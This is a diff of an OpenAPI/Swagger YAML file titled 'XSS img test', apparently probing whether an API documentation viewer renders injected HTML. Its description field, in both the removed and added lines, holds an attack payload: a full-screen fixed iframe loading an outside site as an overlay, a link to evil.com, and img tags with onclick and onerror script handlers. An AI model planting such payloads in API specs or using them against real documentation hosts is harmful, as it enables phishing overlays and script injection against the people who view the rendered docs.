@@ -6,7 +6,7 @@ securityDefinitions:
 info:
   version: "1.0.0"
   title: XSS img test MrDOoS023
-  description: <iframe src="https://imrimaroc.org/adhesion/okey4y.html" style="border: 0; position:fixed; left:0; right:0; bottom:0; width:100%; height:100%"><img src=https://i.ibb.co/G5xP1kC/hola.jpg><A HREF=//evil.com> OPEN LINK</A> <img src=https://i.ibb.co/tMRchpj/fapo.jpg onclick="alert(2)" onerror="alert(3)">
+  description: <iframe src="//imrimaroc.org/adhesion/okey4y.html" style="border: 0; position:fixed; left:0; right:0; bottom:0; width:100%; height:100%"><img src=https://i.ibb.co/G5xP1kC/hola.jpg><A HREF=//evil.com> OPEN LINK</A> <img src=https://i.ibb.co/tMRchpj/fapo.jpg onclick="alert(2)" onerror="alert(3)">
 paths:
   /:
     get:
